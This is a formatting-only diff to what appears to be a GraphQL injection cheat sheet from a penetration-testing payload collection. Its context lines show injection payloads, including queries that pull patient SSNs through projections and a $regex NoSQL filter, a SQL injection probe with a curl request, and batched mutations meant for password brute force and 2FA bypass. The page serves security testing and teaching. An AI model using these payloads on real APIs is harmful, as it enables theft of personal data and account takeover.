@@ -2,7 +2,6 @@
 
 > GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type
 
-
 ## Summary
 
 * [Tools](#tools)
@@ -47,7 +46,6 @@ Check if errors are visible.
 ?query={}
 ?query={thisdefinitelydoesnotexist}
 ```
-
 
 ### Enumerate Database Schema via Introspection
 
@@ -193,8 +191,6 @@ example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
 
 ![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)
 
-
-
 ### Extract data using edges/nodes
 
 ```json
@@ -208,7 +204,7 @@ example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
       }
     }
   }"
-} 
+}
 ```
 
 ### Extract data using projections
@@ -219,8 +215,7 @@ example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
 {doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
 ```
 
-
-### Enumerate the types' definition 
+### Enumerate the types' definition
 
 Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type
 
@@ -244,7 +239,7 @@ Use `$regex`, `$ne` from []() inside a `search` parameter.
 ```json
 {
   doctors(
-    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
+    options: "{\"limit\": 1, \"patients.ssn\" :1}",
     search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
     {
       firstName lastName id patients{ssn}
@@ -252,16 +247,15 @@ Use `$regex`, `$ne` from []() inside a `search` parameter.
 }
 ```
 
-
 ### SQL injection
 
 Send a single inside a graphql parameter to trigger the SQL injection
 
 ```powershell
-{ 
-    bacon(id: "1'") { 
-        id, 
-        type, 
+{
+    bacon(id: "1'") {
+        id,
+        type,
         price
     }
 }
@@ -276,6 +270,7 @@ curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%
 ### GraphQL Batching Attacks
 
 Common scenario:
+
 * Password Brute-force Amplification Scenario
 * 2FA bypassing
 
@@ -303,7 +298,6 @@ mutation finishChannelVerificationMutation(
   third: finishChannelVerificationMutation(input: $input3){...}
 }
 ```
-
 
 ## References
 
